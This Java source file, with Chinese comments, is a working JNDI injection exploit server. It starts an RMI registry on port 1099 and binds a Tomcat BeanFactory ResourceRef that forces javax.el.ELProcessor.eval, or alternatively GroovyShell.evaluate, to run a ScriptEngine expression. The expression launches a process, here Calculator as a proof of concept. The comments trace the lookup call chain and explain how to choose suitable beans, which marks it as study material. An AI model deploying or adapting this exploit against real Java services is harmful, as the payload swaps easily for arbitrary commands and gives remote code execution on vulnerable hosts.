package localfactory;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class TomcatBeanFactoryServer {

    // Bean的选择
    // 1.有一个无参数构造函数
    // 2.有一个函数可以执行代码, 且参数为一个String
    // 3.依赖库比较常见所以被经常使用


    // javax.el.ELProcessor#eval
    // groovy.lang.GroovyShell#evaluate


    // ...
    // InitialContext#lookup("rmi://127.0.0.1:1099/Calc");
    //  GenericURLContext#lookup()
    //   RegistryContext#lookup()
    //    NamingManager#getObjectInstance()
    //     org.apache.naming.factory.BeanFactory#getObjectInstance(ref, name, nameCtx, environment);
    //      method.invoke(bean, valueArray);
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        ResourceRef ref = elProcessorEval();
//        ResourceRef ref = groovyShellEvaluate();

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Calc", referenceWrapper);  // 绑定目录名
        System.out.println("Server Started!");
    }

    private static ResourceRef groovyShellEvaluate() {
//        GroovyShell
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));
        return ref;
    }

    private static ResourceRef elProcessorEval() {
//        ELProcessor
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
//        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
//        ref.add(new StringRefAddr("forceString", "bitterz=eval"));
        // 指定bitterz属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
//        ref.add(new StringRefAddr("bitterz", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ref.add(new StringRefAddr("forceString", "x=eval")); // name=method, x属性使用eval这个setter赋值
        // 给x使用setter赋值时传入的参数
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));

        // 这个eval是如何写出的？
        // ScriptEngineManager支持java和其他语言互相调用
        // Class.newInstance()只能反射无参的构造器
//        ScriptEngineManager m = (ScriptEngineManager) "".getClass().forName("javax.script.ScriptEngineManager").newInstance();
//        m.getEngineByName("JavaScript").eval("");
        return ref;
    }
}